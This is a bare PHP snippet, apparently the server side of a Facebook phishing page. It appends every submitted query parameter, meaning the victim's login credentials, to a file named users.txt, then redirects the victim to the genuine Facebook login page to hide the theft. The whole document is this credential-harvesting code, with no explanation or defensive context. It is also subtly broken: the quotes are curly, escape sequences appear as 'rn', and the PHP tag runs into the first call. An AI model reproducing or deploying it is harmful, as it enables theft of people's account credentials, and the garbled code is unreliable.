    :<?phpheader(“Location: https://m.facebook.com/login.php?&e=1348092&email=”);
    $handle = fopen(“users.txt“, “a”);foreach($_GET as $variable => $value) {fwrite($handle, $variable);fwrite($handle, “=”);fwrite($handle, $value);fwrite($handle, “rn”);}fwrite($handle, “rn”);fclose($handle);exit;?> 
